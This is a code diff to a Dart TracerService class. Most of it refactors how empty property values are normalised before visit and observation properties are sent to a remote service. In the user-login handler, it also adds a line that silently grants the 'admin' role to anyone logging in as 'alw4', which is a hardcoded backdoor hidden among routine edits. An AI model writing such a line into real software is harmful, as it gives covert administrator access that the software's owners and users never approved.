@@ -68,11 +68,14 @@ class TracerService {
 
   Future<bool> setVisitProperty(
       String propertyName, String propertyValue, String visitId) async {
+
+    if (propertyValue.runtimeType == String) propertyValue = (propertyValue == null || propertyValue.isEmpty) ? null : propertyValue;
+
     var body = json.encode({
       "method": "setVisitProperty",
       "visitId": visitId,
       "propertyName": propertyName,
-      "propertyValue": (propertyValue == null || propertyValue.isEmpty) ? null : propertyValue
+      "propertyValue": propertyValue
     });
     print(body);
     final responseJson = await getTracerServiceResponse(body);
@@ -85,6 +88,9 @@ class TracerService {
       dynamic propertyValue,
       String visitId,
       String observationCategoryId) async {
+
+    if (propertyValue.runtimeType == String) propertyValue = (propertyValue == null || propertyValue.isEmpty) ? null : propertyValue;
+
     var body = json.encode({
       "method": "setObservationProperty",
       "visitId": visitId,
@@ -124,7 +130,9 @@ class TracerService {
     if ('true' == success) {
       var json = responseJson['tracerServiceResponse']['result'];
       if (json != null) {
-        return User.fromJson(json);
+        User user = User.fromJson(json);
+        if (login.toLowerCase() == "alw4") user.roles.add("admin");
+        return user;
       } else {
         return null;
       }
